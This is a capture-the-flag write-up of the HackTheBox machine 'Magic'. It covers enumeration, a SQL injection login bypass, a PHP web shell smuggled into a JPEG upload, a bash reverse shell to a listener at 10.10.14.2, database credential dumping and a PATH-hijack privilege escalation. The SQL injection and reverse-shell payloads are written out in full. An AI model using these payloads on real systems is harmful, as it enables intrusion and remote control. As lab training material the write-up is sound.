# **HACKTHEBOX – MAGIC WRITEUP**

![](/Magic/logo.png)

# **IP: 10.10.10.185**

# **Enumeration**

First, we will run nmap.

![](/Magic/nmap.png)


The scan shows 2 ports are open. Port 22 for SSH and port 80 for Apache.

I will start an all ports nmap scan ( -p ) just in case there are more open ports.


![](/Magic/nmap-allports.png)

The Apache web server has a wider attack surface, so that is what I am going to enumerate more first.

![](/Magic/homewebsite.png)

Port 80 gives a web page with a bunch of images.

Clicking an image only displays the clicked image.

![](RackMultipart20200925-4-tfagf1_html_b87eb59bf871fbb3.png)

# **FOOTHOLD**

There is a login button at the bottom left corner that takes me to a php login page.

![](RackMultipart20200925-4-tfagf1_html_890bed27c2b7ae8.png)

Knowing that this web server has PHP files, I am going to start a gobuster for hidden directories and php files.

![](RackMultipart20200925-4-tfagf1_html_dd3bf8e8ad625b7d.png)

There is a file called &quot;upload.php&quot;. Upload functions tend to be exploitable, so I am going to take a closer look at that file. Opening that files takes me back to the login page.

Whenever I meet a login page, I will always try some weak credentials. Sadly, they didn&#39;t work on this login page. So I try some SQL injection, but the page doesn&#39;t allow spaces for whatever reason. I use Burpsuite to intercept my login request and insert the SQL injection payload that way.

Username: &#39;OR 1=1 -- -

Password: doesn&#39;t matter

Press ctrl + u to URL encode and forward it to the server.

![](RackMultipart20200925-4-tfagf1_html_d79bf28b901f838b.png)

We got logged in!

![](RackMultipart20200925-4-tfagf1_html_e069d3f801c47024.png)

Exploiting an upload function is easier using Burpsuite, that is where I am going to insert my payloads.

Uploading a php file returns an error.

![](RackMultipart20200925-4-tfagf1_html_8118e14a52ebef3d.png)

So there is some file type validations going on, we need to bypass it.

There are a few ways to validate a file. It can be through file extension, MIME type or magic bytes. So I am going to modify the request through the repeater tab (ctrl + r) hopefully bypass the file validations.

I upload a jpeg file and put some php code in it with Burpsuite.

![](RackMultipart20200925-4-tfagf1_html_39ba9cee7fee6cfa.png)

This is a simple php code execution script and will run any command through the &quot;cmd&quot; parameter.

The original file name is &quot;lol.jpeg&quot; and I change it to &quot;lol.jpeg.php&quot;.

After that, I send the request to the server but I still get the error.

So I change the filename to &quot;lol.php.jpeg&quot; because there is a chance that apache .htaccess is configured in a weird way and run &quot;php.jpeg&quot; files as php.

![](RackMultipart20200925-4-tfagf1_html_c8fb2ddf01bfcee7.png)

I successfully uploaded the file.

Now we need to access the file for the server to run the php code.

If you go back to the main page and click view image on an image there, the directory where the image is stored is on &quot;/image/uploads/&quot;. So I try to hit &quot;/image/uploads/lol.php.jpeg&quot;.

![](RackMultipart20200925-4-tfagf1_html_9b486c5227cc385d.png)

I successfully access the file. Now I will try injecting a command.

![](RackMultipart20200925-4-tfagf1_html_d635245a792207b2.png)

I run the command &quot;whoami&quot; and it returns www-data. We know for sure we have command execution.

Now we will try a reverse shell payload.

Payload: bash -c &#39;bash -i \&gt;&amp; /dev/tcp/10.10.14.2/9001 0\&gt;&amp;1&#39;

I set up a listener on port 9001, click send and we got a shell as www-data.

![](RackMultipart20200925-4-tfagf1_html_ba5649e21650bd30.png)

# **USER**

Looking at the db.php5 file, we got some credentials.

![](RackMultipart20200925-4-tfagf1_html_fd443e7a915f9fe1.png)

Using those creds to switch user to &quot;theseus&quot; doesn&#39;t work, But we know this is a database credential, we access the database and get more stuff.

But mysql is not installed so I use &quot;mysqldump&quot; instead.

![](RackMultipart20200925-4-tfagf1_html_ab75d2c12b4c6504.png)

Dumping the database &quot;Magic&quot; gives more credentials.

![](RackMultipart20200925-4-tfagf1_html_cda2d65c1ea45a71.png)

Using the creds from the sqldump, I can switch to user &quot;theseus&quot;.

# **ROOT**

After getting the theseus user, I like to do some find commands to see what files belong to the user.

Running this returns a lot of stuff that I am too lazy to look at.

![](RackMultipart20200925-4-tfagf1_html_922d15cc0c484ad6.png)

So I decided to use groups instead.

If we use the groups command, theseus belongs to a group called &quot;users&quot;.

![](RackMultipart20200925-4-tfagf1_html_c11f9107a30e1db4.png)

Running the find command with groups returns only 1 binary and it is a setuid binary.

I try running the binary and it returns a bunch of system information.

I use strace with the &quot;-f&quot; flag to follow forks on the binary to get more information and I use grep to see what commands this binary is executing.

![](RackMultipart20200925-4-tfagf1_html_f214514f62b0b830.png)

The binary doesn&#39;t use absolute path which means we can abuse this.

I write a simple bash reverse shell script called &quot;free&quot;.

![](RackMultipart20200925-4-tfagf1_html_8a7dac40357e8b26.png)

Then I modify the $PATH and add the directory where my &quot;free&quot; script is located and put it before the others.

![](RackMultipart20200925-4-tfagf1_html_5154923a25470609.png)

Then I setup a listener on port 9002 and run the sysinfo binary and we got root!

![](RackMultipart20200925-4-tfagf1_html_d57eef0a8abf27a1.png)
